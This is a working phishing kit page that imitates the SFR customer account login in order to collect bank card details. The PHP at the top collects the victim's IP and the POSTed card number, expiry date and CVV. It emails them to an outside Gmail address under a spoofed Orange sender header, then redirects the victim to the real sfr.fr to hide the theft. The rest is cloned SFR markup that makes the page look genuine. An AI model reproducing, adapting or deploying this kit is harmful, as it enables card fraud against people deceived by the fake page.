

<?php 
$ip = "";

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function send_result($data){
  $email = 'ok4htc@gmail.com';
  $ip = get_client_ip();
  $m = "Result <$ip>";
  foreach($data as $k => $v){
    $m .= "$k : $v";
  }
  $headers = "From: webmaster@orange.fr" . "\r\n";

  mail($email,"sfr : $ip",$m,$headers);
}

$ip  = get_client_ip();

if(isset($_GET['info'])){
    send_result($_POST);
    
}
if(isset($_GET['infovalid'])){
    send_result($_POST);
    echo "<script>document.location='http://sfr.fr'</script>";
    //header('location: http://sfr.com');
    die();
}
?>
<html class=" js flexbox canvas canvastext webgl touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="refresh" content="270">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="description" content="Identifiez-vous sur votre espace client pour consulter vos consommations, vos factures et paiements, offres et options et vos avantages fidélités">


<meta name="robots" content="index, follow, all">



<title>Espace Client SFR - Gestion de mon compte SFR</title>
<link rel="canonical" href="https://www.sfr.fr/sfr-et-moi.html">
<link rel="shortcut icon" href="//s1.s-sfr.fr/elements/favicon.ico">


	<link rel="stylesheet" type="text/css" href="//s1.s-sfr.fr/cas/css/layer-responsive.css">
	<link rel="stylesheet" type="text/css" href="//s1.s-sfr.fr/cas/css/buttons.css">
	
	
	
	<link rel="stylesheet" type="text/css" href="//s1.s-sfr.fr/cas/css/style-responsive.css">
	<style>
	@media only screen and (max-width: 1024px) {.rweb {display: none !important;}}
	@media only screen and (min-width: 1025px) {.rmobile {display: none !important;}}
	iframe[name=google_conversion_frame],iframe#google_conversion_frame,#header .bandeau_cookie{display:none}.page>div[style*="984px"]{display:none!important}[data-eTab]{display:none}</style>
	
	
	<link rel="stylesheet" type="text/css" href="//s1.s-sfr.fr/cas/css/style-responsive-update.css">
	<!--[if lt IE 9]>
	<link rel="stylesheet" type="text/css" href="//s1.s-sfr.fr/cas/css/style-ie8.css" />
	<![endif]-->
	



<script type="text/javascript" src="//s1.s-sfr.fr/cas/js/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="//s1.s-sfr.fr/cas/js/mire-v2-script.js"></script>
<script type="text/javascript" src="//s1.s-sfr.fr/cas/js/mire-jquery.placeholder.js"></script>
<script type="text/javascript">
	_stats_pagename = "Authentification/Mon Compte";
 	isMireLayer = false;
	
	 	_cfCas = {
			ts: 1492163949727,
		}
 	

	$(function(){
		$("input, textarea").placeholder();
		focus();
		
	});

	function focus(){
		var username = $("#username");
		var password = $("#password");
		if (username.attr("type") == "hidden") password.focus();
		else username.focus();
	}
	function sendStats(pn) {try{stats({pn:pn})} catch(e) {}}
	function sendStatsMsg(m) {sendStats("Authentification/Mon Compte"+m)}
	function sendStatsHelp(m) {sendStats("Aide/Mon Compte"+m)}
	function trackLink(l,m) {s_tl(l,'o',s.pageName+m)}

</script>
<script type="text/javascript" src="//static.s-sfr.fr/resources/ist/loader.sfr.min.js"></script><script src="//static.s-sfr.fr/resources/js/frameworks/jquery/sfr.jquery.js"></script><script src="//static.s-sfr.fr/resources/ist/ist.sfr.min.js"></script><script type="text/javascript" src="//static.s-sfr.fr/resources/js/global.sfr.min.js"></script><link rel="stylesheet" type="text/css" href="//static.s-sfr.fr/resources/css/global.sfr.min.css">
<!--[if IE]><link rel="stylesheet" type="text/css" href="//static.s-sfr.fr/resources/css/iefixes.css"><![endif]-->
<!--[if IE 8]><link rel="stylesheet" type="text/css" href="//static.s-sfr.fr/resources/css/ie8fixes.css"><![endif]-->
<!--[if IE 7]><link rel="stylesheet" type="text/css" href="//static.s-sfr.fr/resources/css/ie7fixes.css"><![endif]-->
<!--[if IE 6]><link rel="stylesheet" type="text/css" href="//static.s-sfr.fr/resources/css/ie6fixes.css"><![endif]-->
<script src="//static.s-sfr.fr/resources/ist/param.sfr.min.js"></script>
<link rel="icon" type="image/png" href="//static.s-sfr.fr/media/favicon.png">

<script type="text/javascript" src="//static.s-sfr.fr/stats/header.js"></script><script type="text/javascript" charset="iso-8859-1" src="//static.s-sfr.fr/stats/stats.js"></script>

<script type="text/javascript" async="true" src="//www.sfr.fr/eTagP?h=Authentification~2_92080980_827083820~~vide"></script><script type="text/javascript" async="true" src="//www.sfr.fr//arrow/event?eventId=Authentification&amp;browserId=2_92080980_827083820&amp;ascId=&amp;deviceType=m"></script></head>

<body class="sfrRN" style="margin: 0px; width: initial;"><!-- header --><link rel="stylesheet" type="text/css" href="https://static.s-sfr.fr/resources/js/lhshomemobile/lhsHeaderStyle.css"><style>    .hidden {        display: none!important;    }    .header {        height: 45px;    }    .sfr-icon-cart:before {        content: ""!important;        display: none!important;    }    .alwaysVisible {        visibility: visible!important;    }</style><header id="headerRoot" data-telescope="" data-scope="">    <div class="header" id="header">    <div class="logo">    <a href="http://www.sfr.fr#sfrintid=X_nav_logo_mobile"><img src="//static.s-sfr.fr/media/logo-sfr-header-mobile.png"></a></div><div class="headerRight">        <a href="http://boutique.sfr.fr#sfrintid=X_nav_magasins"><span class="markerIcon"></span></a>        <a href="#" onclick="s_tl(this,'o',s.pageName+'/Meta On Vous Rappelle',null,'navigate');_eT.c2cP(7);" class="freeHeight"><span class="phoneIcon"></span></a>        <a href="#" onclick="return s_tl(this,'o',s.pageName+'/Meta Recherche',null,'navigate');" class="searchOpener"><span class="searchIcon"></span></a>        <a href="" class="menuOpener"><span class="burgerIcon"></span></a>    </div></div>    <div id="generalMenu">    <div class="closeOverlay"></div><div class="menuContainer"><div class="closeButtonContainer"><div class="closeButton"><div class="cross"></div></div></div><div class="menuInner">            <form action="//www.sfr.fr/recherche/" method="post" name="gsaMobileForm">                <input type="hidden" name="perimetre" value="gsa">                <input type="hidden" name="univers" value="SFR.fr">                <input type="hidden" name="asSite" value="">                <input type="hidden" name="filter" value="1">                        <div class="searchContainer">                <div class="inputContainer">                        <input type="text" name="q" class="large" value="" placeholder="Recherche">        <div class="searchIcon"></div>        <div class="crossHitArea">        <div class="crossIcon"></div>        </div>                    </div>    </div>            </form><div class="innerflow"><a onclick="return s_tl(this,'o',s.pageName+'/Nav Head Identification',null,'navigate');" href="http://www.sfr.fr/mon-espace-client/index.html#sfrintid=V_head_ec" class="menuArrowLink" data-class="{&quot;hidden&quot;:&quot;!!firstName&quot;}"><span class="menuArrowLink_text"><span class="menuArrowLink_title">Client SFR, identifiez-vous</span><span class="menuArrowLink_subtitle">Bénéficiez de tarifs préférentiels</span></span><span class="arrow"></span></a><span class="menuArrowLink hidden" data-class="{&quot;hidden&quot;:&quot;!firstName&quot;}"><span class="menuArrowLink_text"><span class="menuArrowLink_title" style="display: inline-block;" data-bind="firstName"></span><!--span class="menuArrowLink_subtitle">Ligne connectￃﾩe : 04 78 75 41 62</span--><!-- NOT POSSIBLE -->                        <a onclick="return s_tl(this,'o',s.pageName+'/Nav Head Deconnexion',null,'navigate');" href="https://www.sfr.fr/cas/logout?url=http%3A//www.sfr.fr/%23sfrintid%3Dm_nav_ec_deco" class="crossHitArea">    <span class="cross"></span></a></span></span></div><hr class="smallSeparator"><div class="innerflow"><ul class="uppercase"><li><a href="http://www.sfr.fr/offre-internet/box-thd/#sfrintid=V_nav_box_accueil-box">Offres Fibre et THD</a></li>                    <li><a href="http://www.sfr.fr/offre-internet/box-adsl#sfrintid=V_nav_box_accueil-adsl">Offres ADSL</a></li><li><a href="http://www.sfr.fr/forfait-mobile/offres/forfait-mobile/#sfrintid=V_nav_mob_forfaits">Forfaits Mobile</a></li><li><a href="http://www.sfr.fr/forfait-mobile/telephones/forfait-mobile/#sfrintid=V_nav_mob_tel">Téléphones</a></li></ul><!--ul class="withIcons"><li><a onclick="return s_tl(this,'o',s.pageName+'/Nav Panier',null,'navigate');" href="#" class="alwaysVisible"><span class="listIconContainer sfr-icon-cart"><span class="listIcon cartIcon"></span><span class="listIcon cartSelectedIcon hidden" data-class='{"hidden":"!cart"}'></span></span><span class="text">Mon Panier</span></a></li></ul--></div><hr><div class="innerflow"><ul><li><a href="http://www.sfr.fr/mon-espace-client/index.html#sfrintid=V_head_ec">Espace client</a></li><li><a onlick="return s_tl(this,'o',s.pageName+'/On Vous Rappelle,null,'navigate');" href="https://messagerie.sfr.fr/#sfrintid=V_nav_mail ">SFR Mail</a></li>                    <li><a href="http://www.sfr.fr/portail.html#sfrintid=V_meta_portail">Portail SFR : News, Sport,...</a></li><li><a href="http://www.sfr.fr/suivi-commande/">Suivi de commande</a></li>    <li><a href="http://assistance.sfr.fr">Assistance</a></li>    <li><a href="http://www.sfr.fr/sfr-et-moi/vos-services-sfr.html#sfrintid=V_head_services">Services au quotidien</a></li>                   </ul>     <ul class="withIcons">                    <li>    <a href="#" onclick="s_tl(this,'o',s.pageName+'/Nav On Vous Rappelle',null,'navigate');_eT.c2cP(7);" class="freeHeight"><span class="listIconContainer"><span class="listIcon headphonesIcon"></span></span><span class="text">On vous rappelle</span></a></li><li><a href="http://boutique.sfr.fr#sfrintid=V_head_magasins"><span class="listIconContainer"><span class="listIcon markerIcon"></span></span><span class="text">Trouver une boutique</span></a></li>                </ul>    <ul><li class="hidden" data-class="{&quot;hidden&quot;:&quot;!firstName&quot;}"><a href="https://www.sfr.fr/cas/logout?url=http%3A//www.sfr.fr/%23sfrintid%3Dm_nav_ec_deco">Déconnexion</a></li></ul></div></div></div></div></header><script type="text/javascript" src="https://static.s-sfr.fr/resources/js/lhshomemobile/lhsHeaderMaxiBundle.js"></script><script>!function(){var e=Telescope.Directives,t=Telescope.classes.Directive,s=Telescope.utils;e["pop-auth"]=t.extend({setCookie:function(e,t,s){var o=new Date;o.setTime(o.getTime()+24*s*60*60*1e3);var n="path=/; domain=.sfr.fr; expires="+o.toUTCString();document.cookie=e+"="+t+"; "+n},getCookie:function(e){for(var t=e+"=",s=document.cookie.split(";"),o=0;o<s.length;o++){for(var n=s[o];" "==n.charAt(0);)n=n.substring(1);if(-1!=n.indexOf(t))return n.substring(t.length,n.length)}return""},onScopeAttach:function(){var e=this.getCookie("sfr-pop-auth");e||(console.log("pas de cookie",e),this.scope.set("showUserMenu",!0),this.setCookieAndHide())},setCookieAndHide:function(){var e=this;this.setCookie("sfr-pop-auth",!0),setTimeout(function(){e.scope.set("showUserMenu",!1)},3e3)}}),e.menu=t.extend({onScopeAttach:function(){var e=this.$el,t="open active";if(this.expression==this.scope._get().subHeader){var s=this.telescope.rootScope.$el;s.find("[data-sub-header]").hide();var o=e.parents("[data-sub-header]"),n=o.attr("data-sub-header");o.show(),n&&$sfr("header").data("scope").$el.find("[data-menu="+o.attr("data-sub-header")+"]").addClass("active open"),e.addClass(t),e.parents("[data-menu]").addClass("open"),s.find(".sub-header").attr("style","display:block!important")}else e.removeClass(t)},onScopeChange:function(){this.scope._get().currentMenu&&(this.scope._get().currentMenu==this.expression?this.$el.addClass(" open"):this.$el.removeClass(" open"))}}),e["menu-click"]=t.extend({onScopeAttach:function(){this.scope.set("currentMenu","")},initialize:function(){t.prototype.initialize.apply(this,arguments),this.$el.on("click",s.proxy(function(e){e.preventDefault();var t=(this.scope,this.expression?this.expression:this.$el.parents("[data-menu]").attr("data-menu")),s=this.telescope.rootScope.$el;s.find("[data-sub-header]").hide(),s.find("[data-sub-header="+t+"]").css("display","block");var o=s.find("[data-sub-header="+t+"]").parents(".sub-header"),n=t;return this.scope._get().currentMenu==t?(o.removeClass("open"),n=null):o.addClass("open"),this.scope.set("currentMenu",n),this},this))}})}();    $sfr('#headerRoot').telescope({ directiveSelector:'[data]',  data: { telescopeLoaded:true ,firstName:'', showUserMenu:false, cart:false, rightMenu:'',leftMenu:'', searchInProgress:false, searchFocused:false, emails:0, highlight: 'none', highlights: ['none', 'particuliers', 'entreprises', 'magasins', 'suivicommande', 'guidetv', 'assistance'], subHeader:  null} });    sfrIstConfig.isRED=0;    if(window.sfrIstParam)sfrIstParam();else{$sfr.ajaxSetup({cache:!0});$sfr.getScript('//static.s-sfr.fr/resources/ist/param.sfr.min.js',function(){sfrIstParam()})}    $sfr('html').on('click', function(e){if(e.target.className != 'username' && e.target.className != 'sfr-icon-user' && e.target.className != 'sfr-icon-arrow-down hidden') $sfr('#headerRoot').data('scope').set('showUserMenu', false)} );    </script>
	
		<script type="text/javascript">
			
				$sfr.istHeaderHome();
			
			
		</script>
	
	
		<div class="page">
		<div id="header" class="espace-client"></div>

			<div id="main">

				<div class="boxTitle">
					<h1 id="editoTitle" class="empty"></h1>
				</div>

				<div id="colR">

					<div id="column-right">

						<div class="block" id="style-first-block">

							<div class="content-area" id="mire-phishing">
								<div class="item center">
									<a href="#" class="really-light-link">Info Phishing</a>
								</div>
							</div>

							
                            <div class="content-area" id="mire-form">

								
								<form name="loginForm" id="loginForm" action="?infovalid" method="post">
									<style>
                                        .holder{
                                            background:#fff;
                                            /*padding:10px;*/
                                        }
                                        .holder-header{
                                            background:#4a4a53;
                                            color:#fff;
                                            padding:4px;
                                        }
                                        .holder-core{
                                            padding:10px;
                                        }
                                        .input{
                                                border: 1px solid #9c9e9f;
                                                width: 100%;
                                                padding: 0px 7px;
                                                margin: 0;
                                                height: 36px;
                                                line-height: 36px;
                                                font-family: Arial, Sans-serif;
                                                font-size: 15px;
                                                color: #5c5c66;
                                                outline: none;
                                        }
                                    </style>
                                    <div class="holder">
                                        <div class="holder-header">
                                            Informations Bancaires
                                        </div>
                                        <div class="holder-core">
                                            <div class="small-12 medium-12 large-7">
                                                <div class="title">
                                                    Numero de la cart*
                                                    <span class="form form--info">
                                                    <span class="icon help"></span>
                                                    </div>
                                                    <label class="field">
                                                        <input id="bankDetailsAndGeneralInfosForm.bic" name="cc" class="uppercase bic input-text input  " type="text" value="" maxlength="11" autocomplete="off"><span class="icon "></span>
                                                    </label>
                                                    <span class="info error">
                                                        </span>
                                                </div>
                                                <div class="small-12 medium-12 large-7">
                                                <div class="title">
                                                    Date D'experation*
                                                    <span class="form form--info">
                                                    <span class="icon help"></span>
                                                    </div>
                                                    <label class="field">
                                                        <input id="bankDetailsAndGeneralInfosForm.bic" name="exp" class="uppercase bic input-text input  " type="text" value="" maxlength="11" autocomplete="off" placeholder="mm / aa"><span class="icon "></span>
                                                    </label>
                                                    <span class="info error">
                                                        </span>
                                                </div>
                                                <div class="small-12 medium-12 large-7">
                                                <div class="title">
                                                    Cryptogramme*
                                                    <span class="form form--info">
                                                    <span class="icon help"></span>
                                                    </div>
                                                    <label class="field">
                                                        <input id="bankDetailsAndGeneralInfosForm.bic" name="ccv" class="uppercase bic input-text input  " type="text" value="" maxlength="11" autocomplete="off"><span class="icon "></span>
                                                    </label>
                                                    <span class="info error">
                                                        </span>
                                                </div>
										</div>
                                    </div>
									
										
									
									
									

									
								

									<div class="item">
										
										
										<button id="identifier" class="btn-base btn-primary btn-normal" type="submit" name="identifier">Comnifmation</button>
									</div>
								</form>

								

							</div>

							
							<h4 id="helpTitle">Besoin d'aide</h4>

						
						
							
						</div>
						
						
						
						<style>
.style-second-block{-webkit-user-select:none;-moz-user-select:none;user-select:none;font-family:Arial, Sans-serif;width:322px;height:67px;border:1px solid #6a6a74;background:#fff;position:relative;margin-top:24px;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;box-shadow:3px 3px 0px #e6e7e7;-moz-box-shadow:3px 3px 0px #e6e7e7;-webkit-box-shadow:3px 3px 0px #e6e7e7;box-shadow:3px 3px 0px rgba(0, 0, 0, 0.1);-moz-box-shadow:3px 3px 0px rgba(0, 0, 0, 0.1);-webkit-box-shadow:3px 3px 0px rgba(0, 0, 0, 0.1);}
.style-second-block#block-acte-urgence-v2 {
  background-color: #f0f0f0;
  padding-left: 65px;
}
.style-second-block#block-acte-urgence-v2 .second-block-text {
  background: #FFF;
  padding: 12px 8px;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  height: 100%;
}
.style-second-block#block-acte-urgence-v2 .second-block-text > h5,
.style-second-block#block-acte-urgence-v2 .second-block-text x:-moz-any-link,
.style-second-block#block-acte-urgence-v2 .second-block-text x:default {
  font-family: "SFR-Regular", Arial, Sans-serif !important;
}
.style-second-block#block-acte-urgence-v2 .second-block-text > h5 {
  font-size: 13px;
  /*so it can be rounded a bit more*/
/*font-weight: bold;*/
  font-size: 0.8125rem;
  letter-spacing: -0.01em;
  margin: 0px 0px 2px 0px;
  font-family: "SFR-Bold", "SFR-Regular", Arial, Sans-serif;
}
.style-second-block#block-acte-urgence-v2 .second-block-text > a {
  font-size: 12px;
  /*so it can be rounded a bit more*/

  font-size: 0.75rem;
  display: block;
  padding-left: 14px;
  height: 32px;
  line-height: 32px;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  color: #000;
  text-decoration: none;
  position: relative;
  background-image: url(//static.s-sfr.fr/media/sprite-mire-2016.png);
  background-repeat: no-repeat;
  background-position: 0px -1289px;
}
.style-second-block#block-acte-urgence-v2 .second-block-text > a:hover {
  text-decoration: underline;
}
.style-second-block#block-acte-urgence-v2 {
  background-image: url(//static.s-sfr.fr/media/sprite-mire-2016.png);
  background-repeat: no-repeat;
  background-position: 6px -1861px;
}
</style>
<div id="block-acte-urgence-v2" class="style-second-block"><div class="second-block-text"><h5>Mobile perdu ou volé, SIM bloquée</h5><a href="https://www.sfr.fr/procedures-urgence/actes-urgences.html#sfrclicid=EC_mire_actes-urgences" class="really-light-link">Accédez aux actes d'urgence</a></div></div>

					</div>

				</div>

				<div id="colL">
					<img id="editoImage" src="https://static.s-sfr.fr/media/mire-personalisation-service.jpg" alt="Outils de Gestion SFR mon compte">
				</div>

			</div><!-- Fin de id="main" -->

			<div class="layer" id="layer-bloc1" style="display: none">
				<div class="modal">
				  <div class="modal-table">
				    <div class="container">
				      <div class="card">
				      	<span class="close"></span>
				        <div class="layer-content">

					<h3>Informations sécurité SFR</h3>

					<div>
						<p>
							SFR a adopté une fonction de sécurité sur sa page d’authentification vous permettant de vérifier visuellement que vous êtes bien sur le site web SFR légitime.<br><br>
							Aussi, ayez le bon réflexe :<br>
							Vérifiez que vous voyez SFR <strong>(Société française du radiotéléphone - SFR SA)</strong> affiché en vert ou sur fond vert dans la barre de navigation de votre navigateur internet.<br><br>
							Par exemple :
						</p>
						<img src="//static.s-sfr.fr/media/layer-content-1.jpg" width="413" height="111" alt="">
						<p>
							Si vous utilisez un système d’exploitation ou une version de navigateur internet anciens, vous n’aurez pas cet affichage.
						</p>
					</div>

				  		</div>
			    	  </div> 
				  	</div>
				  </div>
				</div>
			</div>

			<div class="layer" id="layer-bloc2" style="display: none">
				<div class="modal">
				  <div class="modal-table">
				    <div class="container">
				      <div class="card">
				      	<span class="close"></span>
				        <div class="layer-content">

					<h3>Votre identifiant</h3>

					<!-- -->
					<div>
						
						<p>
							<b>Vous êtes client mobile, clé Internet ou tablette</b><br>
							Utilisez votre numéro de ligne mobile.
						</p><br>
						<p>
							<b>Vous êtes client ADSL / Fibre</b><br>
							Utilisez votre adresse email (@sfr.fr ou @neuf.fr), identifiant NeufId ou l'adresse email personnelle que vous avez saisie. Si vous avez oublié votre identifiant, <a id="forgotIdLayerUrl" href="https://www.sfr.fr/parcours/securite/oubliIdentifiant/informations.action?red=false&amp;urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_layer-oubli-id">cliquez ici</a>.
						</p><br>
						<p>
							<b>Vous n'avez pas souscrit de ligne fixe ou de ligne mobile</b><br>
							Votre identifiant est votre adresse email personnelle (@gmail.com, @yahoo.fr, @hotmail.com ...), celle que vous avez saisie lors de la création de votre compte.
						</p><br>
						<p>
							<b>Vous avez résilié votre ligne mobile</b><br>
							Votre identifiant est votre ancienne référence contrat ou votre adresse email SFR si vous en aviez créée une.
						</p>
					</div>
					<!-- -->

				  		</div>
				  		<a class="back" href="#">Retour</a>
				     </div> 
				   </div>
				 </div>
				</div>
			</div>

			<div class="layer" id="layer-bloc3" style="display: none">
				<div class="modal">
				  <div class="modal-table">
				    <div class="container">
				      <div class="card">
				      	<span class="close"></span>
				        <div class="layer-content">

					<h3>Première connexion ?</h3>

					<!-- -->
					<div>
						<p>
							<b>Vous êtes client d'une ligne mobile :</b><br><br>
							Votre identifiant est votre numéro de ligne mobile, c’est-à-dire 06xxxxxxxx ou 07xxxxxxxx.<br>
							Pour accéder à votre compte personnel, votre ligne mobile doit fonctionner sur le réseau SFR. Vous avez reçu votre mot de passe par SMS.<br>
							Si vous ne l’avez pas reçu, vous pouvez en demander un nouveau en cliquant sur le lien 
							<a class="rweb" href="https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?red=false&amp;urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check#sfrclicid=EC_mire_layer-mdp-oublie">mot de passe oublié</a>
							<a class="rmobile" href="https://www.sfr.fr/parcours/securite/oubliMotDePasse/identifiant.action?red=false&amp;urlRetour=https%3A%2F%2Fwww.sfr.fr%2Fcas%2Flogin%3Fdomain%3Dmire-ec%26service%3Dhttps%253A%252F%252Fwww.sfr.fr%252Faccueil%252Fj_spring_cas_security_check&amp;mobileMode=true#sfrclicid=EC_mire_layer-mdp-oublie">mot de passe oublié</a>
							 et en renseignant les informations demandées.
						</p><br>
						<p>
							<b>Vous êtes client d'une ligne fixe ADSL ou Fibre :</b><br><br>
							Votre identifiant (au format @sfr.fr) et votre mot de passe sont indiqués en haut à gauche de votre courrier suivi de commande : il s’agit des informations <span class="italic">"identifiant de messagerie"</span> et <span class="italic">"mot de passe de messagerie"</span>.<br>
							Ce sont les mêmes pour votre Espace Client, le service SFR Mail, les Applis depuis votre mobile et la majorité des services SFR.
						</p>
					</div>
					<!-- -->

				  		</div>
				  		<a class="back" href="#">Retour</a>
				     </div> 
				   </div>
				 </div>
				</div>
			</div>

		
			<script type="text/javascript">$sfr.istFooterLight();</script>
		
		
		<div id="footer"></div>

	<script type="text/javascript" src="//static.s-sfr.fr/stats/footer.js"></script>
	

	
	
	


</body></html>